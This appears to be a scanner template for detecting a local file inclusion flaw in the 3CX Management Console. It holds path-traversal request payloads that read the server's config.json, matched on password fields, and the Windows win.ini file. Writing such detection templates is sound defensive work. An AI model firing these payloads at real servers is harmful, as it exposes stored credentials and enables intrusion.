id: 3cx-management-console
brief:
    title: 3CX Management Console - Local File Inclusion
    by: random-robbie
    level: high
    about: 3CX Management Console is vulnerable to local file inclusion.
    label:
        - 3cx
        - lfi
        - voip
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json'
        - '{{BaseURL}}/Electron/download/windows/\windows\win.ini'
      signs:
        - "on": word
          has:
            - CfgServerPassword
            - CfgServerAppName
          in: body
          need: all
        - "on": word
          has:
            - bit app support
            - fonts
            - extensions
          in: body
          need: all
